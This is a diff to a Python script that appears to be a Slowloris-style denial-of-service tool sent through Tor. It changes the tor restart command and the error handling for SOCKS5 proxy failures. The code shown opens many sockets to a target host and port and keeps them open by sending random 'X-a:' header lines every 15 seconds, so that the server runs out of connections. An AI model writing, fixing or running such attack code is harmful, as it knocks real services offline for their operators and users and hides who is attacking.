@@ -19,7 +19,7 @@ parser.add_argument("-P", "--port", help="Target port")
 argus = parser.parse_args()
 
 try:
-    os.system('service tor restart &&')
+    os.system('service tor restart && sleep 1')
 except:
     print 'Do you have tor installed? apt-get install tor'
     sys.exit(0)
@@ -108,7 +108,7 @@ def main():
             for i in range(int(max_socket)):
                 try:
                     s = MainThread(argus.host,argus.port).run()             
-                except socket.error:
+                except socks.SOCKS5Error:
                     break
                 socket_list.append(s)
             while True:
@@ -116,14 +116,14 @@ def main():
                 for s in list(socket_list):
                     try:
                         s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-                    except socket.error:
+                    except socks.SOCKS5Error:
                         socket_list.remove(s)
                 for i in range(int(max_socket) - len(socket_list)):
                     try:
                         s = MainThread(argus.host,argus.port).run()
                         if s:
                             socket_list.append(s)
-                    except socket.error:
+                    except socks.SOCKS5Error:
                         break
                 time.sleep(15)
                 
@@ -142,4 +142,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
